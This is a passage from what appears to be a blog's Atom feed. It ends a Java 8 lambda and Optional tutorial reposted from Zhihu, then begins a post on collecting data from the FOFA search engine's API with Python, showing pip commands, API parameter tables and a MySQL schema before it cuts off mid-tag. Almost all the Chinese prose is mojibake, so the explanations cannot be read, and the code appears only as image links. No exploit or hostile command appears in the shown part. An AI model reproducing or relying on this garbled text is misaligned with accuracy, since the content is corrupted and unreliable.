ä¼˜é›…ç®€æ´ã€‚å¹¶ä¸”ï¼Œç”±äºLambdaå¯ä»¥ç›´æ¥èµ‹å€¼ç»™ä¸€ä¸ªå˜é‡ï¼Œæˆ‘ä»¬å°±å¯ä»¥ç›´æ¥æŠŠLambdaä½œä¸ºå‚æ•°ä¼ ç»™å‡½æ•°, è€Œä¼ ç»Ÿçš„Javaå¿…é¡»æœ‰æ˜ç¡®çš„æ¥å£å®ç°çš„å®šä¹‰ï¼Œåˆå§‹åŒ–æ‰è¡Œï¼š</p><p><img src="https://img.zhiiyun.com/v2-28606f4328308baf7f70a36bd689e5ea_hd.jpg" alt=""></p><p>æœ‰äº›æƒ…å†µä¸‹ï¼Œè¿™ä¸ªæ¥å£å®ç°åªéœ€è¦ç”¨åˆ°ä¸€æ¬¡ã€‚ä¼ ç»Ÿçš„Java 7å¿…é¡»è¦æ±‚ä½ å®šä¹‰ä¸€ä¸ªâ€œæ±¡æŸ“ç¯å¢ƒâ€çš„æ¥å£å®ç°MyInterfaceImplï¼Œè€Œç›¸è¾ƒä¹‹ä¸‹Java 8çš„Lambda, å°±æ˜¾å¾—å¹²å‡€å¾ˆå¤šã€‚</p><h3 id="Lambdaç»“åˆFunctionalInterface-Lib-forEach-stream-ï¼Œmethod-referenceç­‰æ–°ç‰¹æ€§å¯ä»¥ä½¿ä»£ç å˜çš„æ›´åŠ ç®€æ´ï¼"><a href="#Lambdaç»“åˆFunctionalInterface-Lib-forEach-stream-ï¼Œmethod-referenceç­‰æ–°ç‰¹æ€§å¯ä»¥ä½¿ä»£ç å˜çš„æ›´åŠ ç®€æ´ï¼" class="headerlink" title="Lambdaç»“åˆFunctionalInterface Lib, forEach, stream()ï¼Œmethod referenceç­‰æ–°ç‰¹æ€§å¯ä»¥ä½¿ä»£ç å˜çš„æ›´åŠ ç®€æ´ï¼"></a>Lambdaç»“åˆFunctionalInterface Lib, forEach, stream()ï¼Œmethod referenceç­‰æ–°ç‰¹æ€§å¯ä»¥ä½¿ä»£ç å˜çš„æ›´åŠ ç®€æ´ï¼</h3><p>ç›´æ¥ä¸Šä¾‹å­ã€‚</p><p>å‡è®¾Personçš„å®šä¹‰å’ŒList<person>çš„å€¼éƒ½ç»™å®šã€‚</person></p><p><img src="https://img.zhiiyun.com/v2-02ae14b4c341e2303ae86e2da6a038a2_hd.jpg" alt=""></p><p>ç°åœ¨éœ€è¦ä½ æ‰“å°å‡ºguiltyPersons Listé‡Œé¢æ‰€æœ‰LastNameä»¥â€Zâ€å¼€å¤´çš„äººçš„FirstNameã€‚</p><p>åŸç”Ÿæ€Lambdaå†™æ³•ï¼šå®šä¹‰ä¸¤ä¸ªå‡½æ•°å¼æ¥å£ï¼Œå®šä¹‰ä¸€ä¸ªé™æ€å‡½æ•°ï¼Œè°ƒç”¨é™æ€å‡½æ•°å¹¶ç»™å‚æ•°èµ‹å€¼Lambdaè¡¨è¾¾å¼ã€‚</p><p><img src="https://img.zhiiyun.com/v2-fdef41934be8804fa244e89c84a567f1_hd.jpg" alt=""></p><p>è¿™ä¸ªä»£ç å®é™…ä¸Šå·²ç»æ¯”è¾ƒç®€æ´äº†ï¼Œä½†æ˜¯æˆ‘ä»¬è¿˜å¯ä»¥æ›´ç®€æ´ä¹ˆï¼Ÿå½“ç„¶å¯ä»¥ã€‚åœ¨Java 8ä¸­æœ‰ä¸€ä¸ªå‡½æ•°å¼æ¥å£çš„åŒ…ï¼Œé‡Œé¢å®šä¹‰äº†å¤§é‡å¯èƒ½ç”¨åˆ°çš„å‡½æ•°å¼æ¥å£ï¼ˆjava.util.function (Java Platform SE 8 )ï¼‰ã€‚æ‰€ä»¥ï¼Œæˆ‘ä»¬åœ¨è¿™é‡Œå‹æ ¹éƒ½ä¸éœ€è¦å®šä¹‰NameCheckerå’ŒExecutorè¿™ä¸¤ä¸ªå‡½æ•°å¼æ¥å£ï¼Œç›´æ¥ç”¨Java 8å‡½æ•°å¼æ¥å£åŒ…é‡Œçš„Predicate<t>å’ŒConsumer<t>å°±å¯ä»¥äº†â€”â€”å› ä¸ºä»–ä»¬è¿™ä¸€å¯¹çš„æ¥å£å®šä¹‰å’ŒNameChecker/Executorå…¶å®æ˜¯ä¸€æ ·çš„ã€‚<br>c</t></t></p><h4 id="ç¬¬ä¸€æ­¥ç®€åŒ–-åˆ©ç”¨å‡½æ•°å¼æ¥å£åŒ…ï¼š"><a href="#ç¬¬ä¸€æ­¥ç®€åŒ–-åˆ©ç”¨å‡½æ•°å¼æ¥å£åŒ…ï¼š" class="headerlink" title="ç¬¬ä¸€æ­¥ç®€åŒ– - åˆ©ç”¨å‡½æ•°å¼æ¥å£åŒ…ï¼š"></a>ç¬¬ä¸€æ­¥ç®€åŒ– - åˆ©ç”¨å‡½æ•°å¼æ¥å£åŒ…ï¼š</h4><p>é™æ€å‡½æ•°é‡Œé¢çš„for eachå¾ªç¯å…¶å®æ˜¯éå¸¸ç¢çœ¼çš„ã€‚è¿™é‡Œå¯ä»¥åˆ©ç”¨Iterableè‡ªå¸¦çš„forEach()æ¥æ›¿ä»£ã€‚forEach()æœ¬èº«å¯ä»¥æ¥å—ä¸€ä¸ªConsumer<t> å‚æ•°ã€‚</t></p><p><img src="https://img.zhiiyun.com/v2-493168d1a72120d69b0d13b4711c3c9f_hd.jpg" alt=""></p><h4 id="ç¬¬äºŒæ­¥ç®€åŒ–-ç”¨Iterable-forEach-å–ä»£foreach-loopï¼š"><a href="#ç¬¬äºŒæ­¥ç®€åŒ–-ç”¨Iterable-forEach-å–ä»£foreach-loopï¼š" class="headerlink" title="ç¬¬äºŒæ­¥ç®€åŒ– - ç”¨Iterable.forEach()å–ä»£foreach loopï¼š"></a>ç¬¬äºŒæ­¥ç®€åŒ– - ç”¨Iterable.forEach()å–ä»£foreach loopï¼š</h4><p><img src="https://img.zhiiyun.com/v2-bdd6f5a6dbf65b578080f7b7ad5ab6cf_hd.jpg" alt=""></p><p>ç”±äºé™æ€å‡½æ•°å…¶å®åªæ˜¯å¯¹Listè¿›è¡Œäº†ä¸€é€šæ“ä½œï¼Œè¿™é‡Œæˆ‘ä»¬å¯ä»¥ç”©æ‰é™æ€å‡½æ•°ï¼Œç›´æ¥ä½¿ç”¨stream()ç‰¹æ€§æ¥å®Œæˆã€‚stream()çš„å‡ ä¸ªæ–¹æ³•éƒ½æ˜¯æ¥å—Predicate<t>ï¼ŒConsumer<t>ç­‰å‚æ•°çš„ï¼ˆjava.util.stream (Java Platform SE 8 )ï¼‰ã€‚ä½ ç†è§£äº†ä¸Šé¢çš„å†…å®¹ï¼Œstream()è¿™é‡Œå°±éå¸¸å¥½ç†è§£äº†ï¼Œå¹¶ä¸éœ€è¦å¤šåšè§£é‡Šã€‚</t></t></p><h4 id="ç¬¬ä¸‰æ­¥ç®€åŒ–-åˆ©ç”¨stream-æ›¿ä»£é™æ€å‡½æ•°ï¼š"><a href="#ç¬¬ä¸‰æ­¥ç®€åŒ–-åˆ©ç”¨stream-æ›¿ä»£é™æ€å‡½æ•°ï¼š" class="headerlink" title="ç¬¬ä¸‰æ­¥ç®€åŒ– - åˆ©ç”¨stream()æ›¿ä»£é™æ€å‡½æ•°ï¼š"></a>ç¬¬ä¸‰æ­¥ç®€åŒ– - åˆ©ç”¨stream()æ›¿ä»£é™æ€å‡½æ•°ï¼š</h4><p><img src="https://img.zhiiyun.com/v2-e196d987f852b9b8e26a6a9dac648a06_hd.jpg" alt=""></p><p>å¯¹æ¯”æœ€å¼€å§‹çš„Lambdaå†™æ³•ï¼Œè¿™é‡Œå·²ç»éå¸¸éå¸¸ç®€æ´äº†ã€‚ä½†æ˜¯å¦‚æœï¼Œæˆ‘ä»¬çš„è¦æ±‚å˜ä¸€ä¸‹ï¼Œå˜æˆprintè¿™ä¸ªäººçš„å…¨éƒ¨ä¿¡æ¯ï¼ŒåŠp -&gt; System.out.println(p); é‚£ä¹ˆè¿˜å¯ä»¥åˆ©ç”¨Method referenceæ¥ç»§ç»­ç®€åŒ–ã€‚æ‰€è°“Method reference, å°±æ˜¯ç”¨å·²ç»å†™å¥½çš„åˆ«çš„Object/Classçš„methodæ¥ä»£æ›¿Lambda expressionã€‚æ ¼å¼å¦‚ä¸‹ï¼š</p><p><img src="https://img.zhiiyun.com/v2-12622326a5682285ce235d96291f3bb8_hd.jpg" alt=""></p><h4 id="ç¬¬å››æ­¥ç®€åŒ–-å¦‚æœæ˜¯println-p-ï¼Œåˆ™å¯ä»¥åˆ©ç”¨Method-referenceä»£æ›¿forEachä¸­çš„Lambdaè¡¨è¾¾å¼ï¼š"><a href="#ç¬¬å››æ­¥ç®€åŒ–-å¦‚æœæ˜¯println-p-ï¼Œåˆ™å¯ä»¥åˆ©ç”¨Method-referenceä»£æ›¿forEachä¸­çš„Lambdaè¡¨è¾¾å¼ï¼š" class="headerlink" title="ç¬¬å››æ­¥ç®€åŒ– - å¦‚æœæ˜¯println(p)ï¼Œåˆ™å¯ä»¥åˆ©ç”¨Method referenceä»£æ›¿forEachä¸­çš„Lambdaè¡¨è¾¾å¼ï¼š"></a>ç¬¬å››æ­¥ç®€åŒ– - å¦‚æœæ˜¯println(p)ï¼Œåˆ™å¯ä»¥åˆ©ç”¨Method referenceä»£æ›¿forEachä¸­çš„Lambdaè¡¨è¾¾å¼ï¼š</h4><p><img src="https://img.zhiiyun.com/v2-f29e6569d0265b91794565ae81d54265_hd.jpg" alt=""></p><p>è¿™åŸºæœ¬ä¸Šå°±æ˜¯èƒ½å†™çš„æœ€ç®€æ´çš„ç‰ˆæœ¬äº†ã€‚</p><h3 id="Lambdaé…åˆOptionalå¯ä»¥ä½¿Javaå¯¹äºnullçš„å¤„ç†å˜çš„å¼‚å¸¸ä¼˜é›…"><a href="#Lambdaé…åˆOptionalå¯ä»¥ä½¿Javaå¯¹äºnullçš„å¤„ç†å˜çš„å¼‚å¸¸ä¼˜é›…" class="headerlink" title="Lambdaé…åˆOptionalå¯ä»¥ä½¿Javaå¯¹äºnullçš„å¤„ç†å˜çš„å¼‚å¸¸ä¼˜é›…"></a>Lambdaé…åˆOptional<t>å¯ä»¥ä½¿Javaå¯¹äºnullçš„å¤„ç†å˜çš„å¼‚å¸¸ä¼˜é›…</t></h3><p>è¿™é‡Œå‡è®¾æˆ‘ä»¬æœ‰ä¸€ä¸ªperson objectï¼Œä»¥åŠä¸€ä¸ªperson objectçš„Optional wrapper:</p><p><img src="https://img.zhiiyun.com/v2-e78d71b9699504e46d86d77aabec42cf_hd.jpg" alt=""></p><p>Optional<t>å¦‚æœä¸ç»“åˆLambdaä½¿ç”¨çš„è¯ï¼Œå¹¶ä¸èƒ½ä½¿åŸæ¥ç¹ççš„null checkå˜çš„ç®€å•ã€‚</t></p><p><img src="https://img.zhiiyun.com/v2-ce82e2c3e69caab9acdec9d4e42cde0e_hd.jpg" alt=""></p><h3 id="åªæœ‰å½“Optionalç»“åˆLambdaä¸€èµ·ä½¿ç”¨çš„æ—¶å€™ï¼Œæ‰èƒ½å‘æŒ¥å‡ºå…¶çœŸæ­£çš„å¨åŠ›ï¼"><a href="#åªæœ‰å½“Optionalç»“åˆLambdaä¸€èµ·ä½¿ç”¨çš„æ—¶å€™ï¼Œæ‰èƒ½å‘æŒ¥å‡ºå…¶çœŸæ­£çš„å¨åŠ›ï¼" class="headerlink" title="åªæœ‰å½“Optionalç»“åˆLambdaä¸€èµ·ä½¿ç”¨çš„æ—¶å€™ï¼Œæ‰èƒ½å‘æŒ¥å‡ºå…¶çœŸæ­£çš„å¨åŠ›ï¼"></a>åªæœ‰å½“Optional<t>ç»“åˆLambdaä¸€èµ·ä½¿ç”¨çš„æ—¶å€™ï¼Œæ‰èƒ½å‘æŒ¥å‡ºå…¶çœŸæ­£çš„å¨åŠ›ï¼</t></h3><p>æˆ‘ä»¬ç°åœ¨å°±æ¥å¯¹æ¯”ä¸€ä¸‹ä¸‹é¢å››ç§å¸¸è§çš„nullå¤„ç†ä¸­ï¼ŒJava 8çš„Lambda+Optional<t>å’Œä¼ ç»ŸJavaä¸¤è€…ä¹‹é—´å¯¹äºnullçš„å¤„ç†å·®å¼‚ã€‚</t></p><h4 id="æƒ…å†µä¸€-å­˜åœ¨åˆ™å¼€å¹²"><a href="#æƒ…å†µä¸€-å­˜åœ¨åˆ™å¼€å¹²" class="headerlink" title="æƒ…å†µä¸€ - å­˜åœ¨åˆ™å¼€å¹²"></a>æƒ…å†µä¸€ - å­˜åœ¨åˆ™å¼€å¹²</h4><p><img src="https://img.zhiiyun.com/v2-f41305009c93effa8fe047631d5342ed_hd.jpg" alt=""></p><h4 id="æƒ…å†µäºŒ-å­˜åœ¨åˆ™è¿”å›ï¼Œæ— åˆ™è¿”å›å±"><a href="#æƒ…å†µäºŒ-å­˜åœ¨åˆ™è¿”å›ï¼Œæ— åˆ™è¿”å›å±" class="headerlink" title="æƒ…å†µäºŒ - å­˜åœ¨åˆ™è¿”å›ï¼Œæ— åˆ™è¿”å›å±"></a>æƒ…å†µäºŒ - å­˜åœ¨åˆ™è¿”å›ï¼Œæ— åˆ™è¿”å›å±</h4><p><img src="https://img.zhiiyun.com/v2-cfa0e3298ba94efa29dc9cb8b32356fe_hd.jpg" alt=""></p><h4 id="æƒ…å†µä¸‰-å­˜åœ¨åˆ™è¿”å›ï¼Œæ— åˆ™ç”±å‡½æ•°äº§ç”Ÿ"><a href="#æƒ…å†µä¸‰-å­˜åœ¨åˆ™è¿”å›ï¼Œæ— åˆ™ç”±å‡½æ•°äº§ç”Ÿ" class="headerlink" title="æƒ…å†µä¸‰ - å­˜åœ¨åˆ™è¿”å›ï¼Œæ— åˆ™ç”±å‡½æ•°äº§ç”Ÿ"></a>æƒ…å†µä¸‰ - å­˜åœ¨åˆ™è¿”å›ï¼Œæ— åˆ™ç”±å‡½æ•°äº§ç”Ÿ</h4><p><img src="https://img.zhiiyun.com/v2-4091bb966ac575fd83d5fa07dd7c2dce_hd.jpg" alt=""></p><h4 id="æƒ…å†µå››-å¤ºå‘½è¿ç¯nullæ£€æŸ¥"><a href="#æƒ…å†µå››-å¤ºå‘½è¿ç¯nullæ£€æŸ¥" class="headerlink" title="æƒ…å†µå›› - å¤ºå‘½è¿ç¯nullæ£€æŸ¥"></a>æƒ…å†µå›› - å¤ºå‘½è¿ç¯nullæ£€æŸ¥</h4><p><img src="https://img.zhiiyun.com/v2-7bc0ac86cd29a1cea92a853d73f41cec_hd.jpg" alt=""></p><p>ç”±ä¸Šè¿°å››ç§æƒ…å†µå¯ä»¥æ¸…æ¥šåœ°çœ‹åˆ°ï¼ŒOptional<t>+Lambdaå¯ä»¥è®©æˆ‘ä»¬å°‘å†™å¾ˆå¤šifElseå—ã€‚å°¤å…¶æ˜¯å¯¹äºæƒ…å†µå››é‚£ç§å¤ºå‘½è¿ç¯nullæ£€æŸ¥ï¼Œä¼ ç»Ÿjavaçš„å†™æ³•æ˜¾å¾—å†—é•¿éš¾æ‡‚ï¼Œè€Œæ–°çš„Optional<t>+Lambdaåˆ™æ¸…æ–°è„±ä¿—ï¼Œæ¸…æ¥šç®€æ´ã€‚</t></t></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ä½œè€…ï¼šMingqi</span><br><span class="line">é“¾æ¥ï¼šhttps://www.zhihu.com/question/20125256/answer/324121308</span><br><span class="line">æ¥æºï¼šçŸ¥ä¹</span><br><span class="line">è‘—ä½œæƒå½’ä½œè€…æ‰€æœ‰ã€‚å•†ä¸šè½¬è½½è¯·è”ç³»ä½œè€…è·å¾—æˆæƒï¼Œéå•†ä¸šè½¬è½½è¯·æ³¨æ˜å‡ºå¤„ã€‚</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;ä»€ä¹ˆæ˜¯Lambda&quot;&gt;&lt;a href=&quot;#ä»€ä¹ˆæ˜¯Lambda&quot; class=&quot;headerlink&quot; title=&quot;ä»€ä¹ˆæ˜¯Lambda&quot;&gt;&lt;/a&gt;ä»€ä¹ˆæ˜¯Lambda&lt;/h2&gt;&lt;p&gt;æˆ‘ä»¬çŸ¥é“ï¼Œå¯¹äºä¸€ä¸ªJavaå˜é‡ï¼Œæˆ‘ä»¬å¯ä»¥èµ‹ç»™å…¶ä¸€ä¸ªâ€œå€¼â€ã€‚&lt;/p&gt;
&lt;p&gt;&lt;img 
      
    
    </summary>
    
      <category term="Java" scheme="http://www.r4v3zn.com/categories/Java/"/>
    
    
      <category term="Java" scheme="http://www.r4v3zn.com/tags/Java/"/>
    
      <category term="JDK" scheme="http://www.r4v3zn.com/tags/JDK/"/>
    
      <category term="å‡½æ•°ç¼–ç¨‹" scheme="http://www.r4v3zn.com/tags/%E5%87%BD%E6%95%B0%E7%BC%96%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>FOFAçˆ¬è™«å¤§æ³•â€”â€”APIçš„ç®€å•åˆ©ç”¨</title>
    <link href="http://www.r4v3zn.com/posts/f5ba6079/"/>
    <id>http://www.r4v3zn.com/posts/f5ba6079/</id>
    <published>2019-02-27T10:23:09.000Z</published>
    <updated>2020-11-11T08:06:56.032Z</updated>
    
    <content type="html"><![CDATA[<p>æœ€è¿‘å› é¡¹ç›®éœ€è¦ï¼Œéœ€è¦çˆ¬è™«FOFAé‡Œé¢æ•°æ®è¿›è¡Œæ•°æ®ç»Ÿè®¡åˆ†æï¼Œå› æ­¤å°±æœ‰äº†æœ¬ç¯‡æ–‡ç« ã€‚</p><h2 id="ç¯å¢ƒ"><a href="#ç¯å¢ƒ" class="headerlink" title="ç¯å¢ƒ"></a>ç¯å¢ƒ</h2><p>æè¿°ç¯å¢ƒä¸ºæ–‡ç« ä¸­æ‰€ç”¨åˆ°çš„æ‰€æœ‰æŠ€æœ¯ä»¥åŠä¸­é—´ä»¶å¹¶éå…¨éƒ¨å®‰è£…ï¼Œå¯æ ¹æ®ä½¿ç”¨çš„è§„æ¨¡è¿›è¡Œè°ƒæ•´ä½¿ç”¨ã€‚</p><p>è¯­è¨€ï¼špython2.7ï¼ˆå¿…é¡»ï¼‰</p><p>æ¨¡å—ï¼šrequestsï¼ˆå¿…é¡»ï¼‰</p><p>æ“ä½œç³»ç»Ÿï¼šMacOS 10.13.4ï¼ˆéå¿…é¡»ï¼‰</p><p>åˆ†å¸ƒå¼æ¶ˆæ¯é˜Ÿåˆ—ç®¡ç†ï¼šCeleryï¼ˆæœ€åä¸€èŠ‚å®‰è£…ï¼‰</p><p>æ—¥å¿—è®°å½•ï¼šloggingï¼ˆå¿…é¡»ï¼‰</p><p>ä¸­é—´ä»·ï¼šRedisï¼ˆæœ€åä¸€èŠ‚å®‰è£…ï¼‰/MySQLï¼ˆå¿…é¡»ï¼‰</p><p>æ•°æ®åº“æ“ä½œï¼špymysqlï¼ˆå¿…é¡»ï¼‰/DBUtilsï¼ˆå¿…é¡»ï¼‰</p><h3 id="å®‰è£…ç¯å¢ƒ"><a href="#å®‰è£…ç¯å¢ƒ" class="headerlink" title="å®‰è£…ç¯å¢ƒ"></a>å®‰è£…ç¯å¢ƒ</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"># å®‰è£…requests</span><br><span class="line"></span><br><span class="line">pip isntall requests</span><br><span class="line"></span><br><span class="line"># å®‰è£…celery Mac</span><br><span class="line"></span><br><span class="line">pip install celery</span><br><span class="line"></span><br><span class="line"># å®‰è£…celery Windows</span><br><span class="line"></span><br><span class="line">pip isntall celery=3.1.25</span><br><span class="line"></span><br><span class="line"># å®‰è£… pymysql</span><br><span class="line"></span><br><span class="line">pip install pymysql</span><br><span class="line"></span><br><span class="line"># å®‰è£…logging</span><br><span class="line">pip install logging</span><br><span class="line"></span><br><span class="line"># å®‰è£… DBUtils æ•°æ®åº“è¿æ¥æ± </span><br><span class="line">pip install DBUtils</span><br></pre></td></tr></table></figure><p>æ³¨ï¼šWindowså®‰è£…Celeryæ—¶æœ€å¥½å®‰è£…3.1.25ç‰ˆæœ¬ï¼Œä¸ç„¶å¯èƒ½ä¼šæœ‰æ„æƒ³ä¸åˆ°çš„æƒŠå–œã€‚</p><h2 id="FOFA-API"><a href="#FOFA-API" class="headerlink" title="FOFA API"></a>FOFA API</h2><p>æ–‡æ¡£ï¼š<a href="https://fofa.so/api" target="_blank" rel="noopener">https://fofa.so/api</a></p><p>è¯·æ±‚ï¼š<a href="https://fofa.so/api/v1/search/all" target="_blank" rel="noopener">https://fofa.so/api/v1/search/all</a></p><p>è¯·æ±‚æ–¹å¼ï¼šGET</p><p>è¯·æ±‚å‚æ•°ï¼š</p><table><thead><tr><th style="text-align:center">å‚æ•°åç§°</th><th style="text-align:center">å‚æ•°ç±»å‹</th><th style="text-align:center">å‚æ•°æè¿°</th><th style="text-align:center">æ˜¯å¦å¿…é¡»</th></tr></thead><tbody><tr><td style="text-align:center">email</td><td style="text-align:center">string</td><td style="text-align:center">FOFA proè´¦å·é‚®ç®±</td><td style="text-align:center">æ˜¯</td></tr><tr><td style="text-align:center">key</td><td style="text-align:center">string</td><td style="text-align:center">FOFA proè´¦æˆ·ç™»é™†key</td><td style="text-align:center">æ˜¯</td></tr><tr><td style="text-align:center">qbase64</td><td style="text-align:center">string</td><td style="text-align:center">FOFAæŸ¥è¯¢è¯­å¥base64ç¼–ç </td><td style="text-align:center">æ˜¯</td></tr><tr><td style="text-align:center">page</td><td style="text-align:center">int</td><td style="text-align:center">é¡µç ï¼Œé»˜è®¤ä¸ºç¬¬ä¸€é¡µ</td><td style="text-align:center">å¦</td></tr><tr><td style="text-align:center">size</td><td style="text-align:center">int</td><td style="text-align:center">æ¯é¡µæ•°é‡ï¼Œé»˜è®¤100æ¡</td><td style="text-align:center">å¦</td></tr><tr><td style="text-align:center">fields</td><td style="text-align:center">string</td><td style="text-align:center">å­—æ®µæ®µåˆ—è¡¨ï¼Œé»˜è®¤ä¸ºhostï¼Œç”¨é€—å·åˆ†éš”å¤šä¸ªå‚æ•°ï¼Œå¦‚(fields=ip,title)ï¼Œå¯é€‰çš„åˆ—è¡¨æœ‰ï¼šhost title ip domain port country city</td><td style="text-align:center">å¦</td></tr></tbody></table><p>å“åº”ï¼š</p><table><thead><tr><th style="text-align:center">å‚æ•°åç§°</th><th style="text-align:center">å‚æ•°ç±»å‹</th><th style="text-align:center">å‚æ•°æè¿°</th></tr></thead><tbody><tr><td style="text-align:center">mode</td><td style="text-align:center">string</td><td style="text-align:center">æŸ¥è¯¢æ¨¡å¼</td></tr><tr><td style="text-align:center">page</td><td style="text-align:center">int</td><td style="text-align:center">å½“å‰é¡µç </td></tr><tr><td style="text-align:center">size</td><td style="text-align:center">int</td><td style="text-align:center">è¯·æ±‚è¿”å›ç»“æœçš„æ€»æ•°</td></tr><tr><td style="text-align:center">results</td><td style="text-align:center">array</td><td style="text-align:center">è¯·æ±‚è¿”å›ç»“æœçš„è¯¦æƒ…æ•°ç»„</td></tr></tbody></table><h2 id="æ•°æ®åº“è®¾è®¡"><a href="#æ•°æ®åº“è®¾è®¡" class="headerlink" title="æ•°æ®åº“è®¾è®¡"></a>æ•°æ®åº“è®¾è®¡</h2><p>è®¾è®¡æ•°æ®åº“å­˜æ”¾FOFAçˆ¬è™«æ•°æ®ï¼Œæ–¹ä¾¿ç»Ÿè®¡æŸ¥è¯¢ã€‚</p><table><thead><tr><th style="text-align:center">å­—æ®µåç§°</th><th style="text-align:center">å­—æ®µç±»å‹</th><th style="text-align:center">æ˜¯å¦å…è®¸ä¸ºç©º</th><th style="text-align:center">æè¿°</th></tr></thead><tbody><tr><td style="text-align:center">id</td><td style="text-align:center">int(11)</td><td style="text-align:center">å¦</td><td style="text-align:center">idè‡ªå¢</td></tr><tr><td style="text-align:center">host</td><td style="text-align:center">varchar(255)</td><td style="text-align:center">å¦</td><td style="text-align:center">host</td></tr><tr><td style="text-align:center">ip</td><td style="text-align:center">varchar(255)</td><td style="text-align:center">å¦</td><td style="text-align:center">ipåœ°å€</td></tr><tr><td style="text-align:center">port</td><td style="text-align:center">varchar(255)</td><td style="text-align:center">å¦</td><td style="text-align:center">ç«¯å£å·</td></tr><tr><td style="text-align:center">protocol</td><td style="text-align:center">varchar(255)</td><td style="text-align:center">å¦</td><td style="text-align:center">åè®®</td></tr><tr><td style="text-align:center">country_ name</td><td style="text-align:center">varchar(255)</td><td style="text-align:center">æ˜¯</td><td style="text-align:center">å›½å®¶åç§°</td></tr><tr><td style="text-align:center">region_name</td><td style="text-align:center">varchar(255)</td><td style="text-align:center">æ˜¯</td><td style="text-align:center">çœä»½åç§°</td></tr><tr><td style="text-align:center">city_name</td><td style="text-align:center">varchar(255)</td><td style="text-align:center">æ˜¯</td><td style="text-align:center">åŸå¸‚åç§°</td></tr><tr><td style="text-align:center">isp</td><td style="text-align:center">varchar(255)</td><td style="text-align:center">æ˜¯</td><td style="text-align:center">è¿è¥å•†</td></tr><tr><td style="text-align:center">fofa_sql</td><td style="text-align:center">text</td><td style="text-align:center">å¦</td><td style="text-align:center">FOFAæŸ¥è¯¢è¯­å¥</td></tr><tr><td style="text-align:center">create_date</td><td style="text-align:center">datetime</td><td style="text-align:center">å¦</td><td style="text-align:center">åˆ›å»ºæ—¶é—´</td></tr><tr><td style="text-align:center">update_date</td><td style="text-align:center">datetime</td><td style="text-align:center">å¦</td><td style="text-align:center">æ›´æ–°æ—¶é—´</td></tr></tbody></table><p>sqlè¯­å¥</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> <span class="keyword">IF</span> <span class="keyword">EXISTS</span> <span class="string">`fofa_spider`</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`fofa_spider`</span> (</span><br><span class="line">    <span class="string">`id`</span> <span class="built_in">INT</span> (<span class="number">11</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> AUTO_INCREMENT,</span><br><span class="line">    <span class="string">`host`</span> <span class="built_in">VARCHAR</span> (<span class="number">255</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">    <span class="string">`ip`</span> <span class="built_in">VARCHAR</span> (<span class="number">255</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">    <span class="string">`port`</span> <span class="built_in">VARCHAR</span> (<span class="number">255</span>) <span class="keyword">DEFAULT</span> <span class="literal">NULL</span>,</span><br><span class="line">    <span class="string">`protocol`</span> <span class="built_in">VARCHAR</span> (<span class="number">255</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">    <span class="string">`country_name`</span> <span class="built_in">VARCHAR</span> (<span class="number">255</span>) <span class="keyword">DEFAULT</span> <span class="literal">NULL</span>,</span><br><span class="line">    <span class="string">`region_name`</span> <span class="built_in">VARCHAR</span> (<span class="number">255</span>) <span class="keyword">DEFAULT</span> <span class="literal">NULL</span>,</span><br><span class="line">    <span class="string">`city_name`</span> <span class="built_in">VARCHAR</span> (<span class="number">255</span>) <span class="keyword">DEFAULT</span> <span class="literal">NULL</span>,</span><br><span class="line">    <span class="string">`fofa_sql`</span> <span class="built_in">text</span> <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">    <span class="string">`create_date`</span> DATETIME <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">    <span class="string">`update_date`</span> DATETIME <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">    PRIMARY <span class="keyword">KEY</span> (<span class="string">`id`</span>)</span><br><span class="line">) <span class="keyword">ENGINE</span> = <span class="keyword">INNODB</span> <span class="keyword">DEFAULT</span> <span class="keyword">CHARSET</span> = utf8mb4;</span><br></pre></td></tr></table></figure><p>æ•°æ®åº“sqlæ–‡ä»¶ï¼š<a href="https://github.com/0nise/scripts/blob/master/fofa_spider.sql" target="_blank" rel="noopener">https://github.com/0nise/scripts/blob/master/fofa_spider.sql</a></p><h2 id="å°è¯•ç‰›åˆ€"><a href="#å°è¯•ç‰›åˆ€" class="headerlink" title="å°è¯•ç‰›åˆ€"></a>å°è¯•ç‰›åˆ€</h2><p>æœ¬èŠ‚ä¸»è¦è®²è§£å¯é€‚ç”¨ä¸ä¸€èˆ¬çš„FOFAçˆ¬è™«ï¼Œå¦‚æœéœ€è¦å¤§æ‰¹é‡æ•°æ®çˆ¬è™«è¯·æ‚¨æ¥ç€å¾€ä¸‹çœ‹ã€‚</p><h3 id="ç¯å¢ƒ-1"><a href="#ç¯å¢ƒ-1" class="headerlink" 